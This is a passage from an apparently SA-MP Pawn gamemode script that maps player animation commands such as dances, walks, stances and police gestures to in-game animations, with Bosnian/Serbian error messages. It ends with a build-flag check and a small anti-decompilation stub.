	else if(strcmp(chz, "kiss9", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"KISSING","Playa_Kiss_03",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "injured1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "injured2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"WUZI", "CS_Dead_Guy", 4.0, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "injured3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED", "gas_cwr", 4.0, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "injured4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FINALE", "FIN_Cop1_Loop", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "injured5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWAT","gnstwall_injurd", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sup1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkba",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sup2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkda",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "sup3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","hndshkfa_swt",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "rap1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"RAPPING","RAP_A_Loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "rap2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"RAPPING","RAP_C_Loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "rap3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","prtial_gngtlkD",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "rap4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","prtial_gngtlkH",4.0,1,0,0,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "rap5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BENCHPRESS","gym_bp_celebrate",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "push1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","shake_cara",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "push2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","shake_carSH",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "spray", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SPRAYCAN","spraycan_full",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "medic", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MEDIC","CPR",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "tired1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","IDLE_tired",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "tired2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FAT","Idle_Tired",3.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "box", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GYMNASIUM","GYMshadowbox",4.0,1,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"SWORD","sword_block",50.0,0,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"POLICE","CopTraf_away",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"POLICE","CopTraf_come",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"POLICE","CopTraf_left",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"POLICE","CopTraf_stop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"POLICE","Cop_move_fwd",4.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "cop7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, -1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","WOMAN_IDLESTANCE",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","CAR_HOOKERTALK",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FAT","FatIdle",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"WUZI","Wuzi_Stand_Loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GRAVEYARD","mrnf_loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GRAVEYARD","mrnm_loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance8", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GRAVEYARD","prst_loopa",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance9", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","idlestance_fat",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance10", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","idlestance_old",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance11", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","turn_l",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance12", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BAR","Barcustom_loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stance13", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BAR","Barserve_loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "basket1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BSKTBALL","BBALL_idleloop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "basket2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BSKTBALL","BBALL_Jump_Shot",4.0,0,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "basket3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BSKTBALL","BBALL_run",4.1,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "basket4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"FAT","FatWalk",4.1,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"WUZI","CS_Wuzi_pt1",4.1,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"WUZI","Wuzi_walk",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"POOL","Pool_walk",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","Walk_player",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk8", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","Walk_old",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk9", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","Walk_fatold",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk10", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","woman_walkfatold",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk11", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","woman_walknorm",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk12", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","woman_walkold",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk13", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","woman_walkpro",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "walk14", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"PED","woman_walkshop",3.0,1,1,1,1,1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lean1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GANGS","leanIDLE",4.0,0,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lean2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"MISC","Plyrlean_loop",4.0,0,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "lean3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"BAR","BARman_idle",3.0,0,1,1,1,0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_A", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_B", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_C", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_D", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip5", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_E", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip6", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_F", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "strip7", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"STRIP", "strip_G", 4.1, 1, 1, 1, 1, 1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "dance1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "dance2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "dance3", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "dance4", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bar1", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "BAR", "Barcustom_get", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "bar2", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid, "BAR", "Barserve_glass", 3.0, 0, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "celebrate", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		ApplyAnimation(playerid,"GYMNASIUM","gym_tread_celebrate", 4.0, 1, 0, 0, 0, 0);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "piss", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		SetPlayerSpecialAction(playerid, 68);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "handsup", true) == 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendErrorMessage(playerid, "Niste na nogama.");
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_HANDSUP);
		usingAnimation[playerid] = true;
	}
	else if(strcmp(chz, "stop", true) == 0)
	{
 		if( usingAnimation[ playerid ] )
		{
	    	usingAnimation[playerid] = false;
			StopLoopingAnim(playerid);
			ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		}
		else return SendErrorMessage(playerid, "Ne koristite animaciju.");
	}
	else SendErrorMessage(playerid, "Nepoznata animacija.");
	return 1;
}

#if ZIMSKI_MOD == 0 && XMAS_MOD == 1

	#error Ne mozes upaliti XMAS MOD, a ostaviti ZIMSKI ugasen, moras upaliti oboje ili samo ZIMSKI!

#endif

_:public AntiDeAMX()
{
	new a[][] =
	{
	    "Unarmed (Fist)",
	    "Brass K"
	};
	#pragma unused a
}
